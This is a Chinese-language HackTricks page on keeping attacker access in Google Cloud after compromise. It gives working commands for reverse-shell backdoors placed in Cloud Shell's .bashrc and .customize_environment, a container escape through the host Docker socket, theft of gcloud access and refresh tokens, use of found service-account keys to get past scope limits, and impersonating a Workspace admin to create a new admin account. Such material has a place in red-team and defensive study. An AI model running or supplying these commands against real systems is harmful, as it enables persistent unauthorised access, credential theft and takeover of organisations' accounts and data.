# GCP - 非服务持久性

<details>

<summary><strong>支持 HackTricks 并获得福利！</strong></summary>

* 如果您想在 HackTricks 中看到您的公司广告，或者如果您想访问 PEASS 的最新版本或下载 PDF 版的 HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方 PEASS 和 HackTricks 商品**](https://peass.creator-spring.com)
* 发现[**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github 仓库提交 PR 来分享您的黑客技巧。**

</details>

这些技术在您以某种方式获取了一些 GCP 凭据或在 GCP 环境中运行的机器后非常有用。

## Google 的 Cloud Shell <a href="#e5eb" id="e5eb"></a>

### 持久后门

[**Google Cloud Shell**](https://cloud.google.com/shell/) 可以让您直接从浏览器中访问云资源的命令行，而无需任何相关费用。

您可以从 **Web 控制台** 或运行 **`gcloud cloud-shell ssh`** 来访问 Google 的 Cloud Shell。

对于攻击者来说，这个控制台具有一些有趣的功能：

1. **任何具有 Google Cloud 访问权限的用户**都可以访问完全经过身份验证的 Cloud Shell 实例。
2. 如果没有任何活动发生，该实例将**至少保留其主目录 120 天**。
3. **组织无法监控**该实例的活动。

这基本上意味着攻击者可以在用户的主目录中放置一个后门，只要用户每 120 天至少连接一次到 GC Shell，后门就会存活下来，攻击者只需运行以下命令即可获得 shell：
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
在主文件夹中还有一个名为**`.customize_environment`**的文件，如果存在，每次用户访问**云shell**时都会被**执行**（就像之前的技术一样）。只需插入先前的后门或以下类似的后门，以保持持久性，只要用户**频繁**使用云shell即可：
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
请注意，**在 Cloud Shell 中执行需要身份验证的操作时**，它会在用户的浏览器中弹出一个授权窗口，必须在命令运行之前接受。如果出现意外的弹窗，目标可能会产生怀疑并取消持久化方法。
{% endhint %}

### Google Cloud Shell 容器逃逸

请注意，Google Cloud Shell 在容器内运行，您可以通过以下方式**轻松逃逸到主机**：
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
这在谷歌看来并不被视为漏洞，但它可以让你更全面地了解环境中正在发生的事情。

此外，请注意从主机上你可以找到一个服务账号令牌：
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
具有以下范围：
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
## 令牌劫持

### 已认证用户

如果你成功访问了一个**在GCP中已认证的用户的主文件夹**，默认情况下，你将能够**获取该用户的令牌，而无需进行身份验证**，并且无论你使用令牌的机器是什么，甚至用户是否配置了多因素身份验证。

这是因为默认情况下，你**将能够使用刷新令牌**生成新的令牌。

要获取用户的当前令牌，你可以运行以下命令：
```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
要获取生成新访问令牌的详细信息，请运行：
```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
要使用刷新令牌、客户端ID和客户端密钥获取新的刷新访问令牌，请执行以下操作：
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
### 服务账号

与认证用户一样，如果你成功**获取了服务账号的私钥文件**，你将能够**随意访问该账号**。\
然而，如果你窃取了服务账号的**OAuth令牌**，这可能更有趣，因为即使默认情况下这些令牌只有一个小时的有效期，如果**受害者删除了私有API密钥，OAuth令牌仍然有效直到过期**。

### 元数据

显然，只要你在运行在GCP环境中的机器内部，你就能够通过**联系元数据端点**来访问与该机器关联的服务账号（请注意，你在此端点访问的OAuth令牌通常受到范围限制）。

### 修复措施

这些技术的一些修复措施在[https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)中有解释。

## 绕过访问范围 <a href="#bypassing-access-scopes" id="bypassing-access-scopes"></a>

当使用[访问范围](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam)时，为计算实例（VM）生成的OAuth令牌将**包含一个**[**范围限制**](https://oauth.net/2/scope/)。然而，你可能能够**绕过**这个限制并利用被入侵账号的权限。

**绕过这个限制的最佳方法**要么是在被入侵的主机中**找到新的凭证**，要么是**找到生成没有限制的OUATH令牌的服务密钥**，要么是**跳转到一个限制较少的不同VM**。

**跳转到另一个主机**

可能存在一个访问范围较少的环境中的另一个主机。如果你可以查看`gcloud compute instances list --quiet --format=json`的输出，请查找具有你想要的特定范围或**`auth/cloud-platform`**全包含范围的实例。

还要注意具有默认服务账号分配（`PROJECT_NUMBER-compute@developer.gserviceaccount.com`）的实例。

**查找服务账号密钥**

Google非常明确地指出[**“访问范围不是一种安全机制...当通过OAuth进行身份验证的请求时，它们没有任何效果”**](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam)。

因此，如果你在实例上找到了**服务账号密钥**，你可以绕过限制。这些是用于身份验证到Google Cloud API并**请求没有范围限制的新OAuth令牌的RSA私钥**。

检查是否有任何服务账号在某个时刻导出了密钥：
```bash
for i in $(gcloud iam service-accounts list --format="table[no-heading](email)"); do
echo Looking for keys for $i:
gcloud iam service-accounts keys list --iam-account $i
done
```
这些文件默认情况下**不会存储在计算实例上**，所以要遇到它们需要一些运气。文件的默认名称为`[project-id]-[portion-of-key-id].json`。因此，如果您的项目名称是`test-project`，您可以**在文件系统中搜索`test-project*.json`**以查找此密钥文件。

文件的内容大致如下：
```json
{
"type": "service_account",
"project_id": "[PROJECT-ID]",
"private_key_id": "[KEY-ID]",
"private_key": "-----BEGIN PRIVATE KEY-----\n[PRIVATE-KEY]\n-----END PRIVATE KEY-----\n",
"client_email": "[SERVICE-ACCOUNT-EMAIL]",
"client_id": "[CLIENT-ID]",
"auth_uri": "https://accounts.google.com/o/oauth2/auth",
"token_uri": "https://accounts.google.com/o/oauth2/token",
"auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
"client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/[SERVICE-ACCOUNT-EMAIL]"
}
```
或者，如果是从CLI生成的，它们将如下所示：
```json
{
"name": "projects/[PROJECT-ID]/serviceAccounts/[SERVICE-ACCOUNT-EMAIL]/keys/[KEY-ID]",
"privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
"privateKeyData": "[PRIVATE-KEY]",
"validAfterTime": "[DATE]",
"validBeforeTime": "[DATE]",
"keyAlgorithm": "KEY_ALG_RSA_2048"
}
```
如果您找到其中一个文件，可以告诉**`gcloud`命令**使用此服务帐号重新进行身份验证。您可以在实例上执行此操作，也可以在安装了工具的任何计算机上执行此操作。
```bash
gcloud auth activate-service-account --key-file [FILE]
```
您现在可以按照以下步骤**测试您的新OAuth令牌**：
```bash
TOKEN=`gcloud auth print-access-token`
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN
```
您应该在范围中看到`https://www.googleapis.com/auth/cloud-platform`，这意味着您**不受任何实例级访问范围的限制**。您现在拥有使用分配的所有IAM权限的全部权限。

## 通过域范围委派向Workspace扩散 <a href="#spreading-to-g-suite-via-domain-wide-delegation-of-authority" id="spreading-to-g-suite-via-domain-wide-delegation-of-authority"></a>

[**Workspace**](https://gsuite.google.com)是谷歌的**协作和生产力平台**，包括Gmail、Google日历、Google Drive、Google文档等。

GCP中的**服务帐号**可以通过冒充合法用户来获得访问Workspace中用户数据的权限。这被称为[域范围委派](https://developers.google.com/admin-sdk/reports/v1/guides/delegation)。这包括在GMail中**阅读****电子邮件**、访问Google文档，甚至在G Suite组织中创建新用户帐号等操作。

Workspace有[自己的API](https://developers.google.com/gsuite/aspects/apis)，与GCP完全独立。权限是授予Workspace的，**GCP和Workspace之间没有任何默认关系**。

然而，可以**授予**服务帐号**对Workspace用户的权限**。如果您此时可以访问Web UI，可以浏览到**IAM -> 服务帐号**，查看是否有任何帐号在“域范围委派”列下列出了“已启用”。如果没有启用任何帐号，则该列本身可能**不会出现**（您可以阅读每个服务帐号的详细信息以确认此点）。截至本文撰写时，尽管在Google的错误跟踪器中有一个[请求此功能的问题](https://issuetracker.google.com/issues/116182848)，但目前还没有办法以编程方式执行此操作。

要创建此关系，需要在GCP和Workforce中**启用它**。

#### 测试Workspace访问权限

要测试此访问权限，您需要以JSON格式导出的**服务帐号凭据**。您可能在之前的步骤中已经获取了这些凭据，或者您现在可能具备创建具有启用域范围委派的服务帐号的密钥所需的访问权限。

这个主题有点棘手...您的服务帐号有一个称为"client\_email"的东西，您可以在导出的JSON凭据文件中看到。它可能看起来像`account-name@project-name.iam.gserviceaccount.com`。如果您尝试直接使用该电子邮件地址访问Workforce API调用，即使启用了委派，也会失败。这是因为Workforce目录不会包含GCP服务帐号的电子邮件地址。相反，要与Workforce交互，我们需要实际冒充有效的Workforce用户。

您真正想做的是**冒充具有管理访问权限的用户**，然后使用该访问权限执行诸如**重置密码、禁用多因素身份验证或创建一个新的管理员帐号**之类的操作。

Gitlab创建了[这个Python脚本](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_misc/blob/master/gcp\_delegation.py)，可以执行两个操作-列出用户目录和创建新的管理帐号。以下是如何使用它的方法：
```bash
# Validate access only
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com

# List the directory
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--list

# Create a new admin account
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--account pwned
```
您可以尝试在一系列电子邮件地址上运行此脚本，以冒充各种用户。标准输出将指示服务帐户是否具有对Workforce的访问权限，并且如果创建了新的管理员帐户，则会包含一个随机密码。

如果成功创建了新的管理员帐户，您可以登录[Google管理控制台](https://admin.google.com)，对G Suite中的每个用户的所有内容（电子邮件、文档、日历等）拥有完全控制权。尽情享受吧。

## 参考资料

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版本的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品，[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
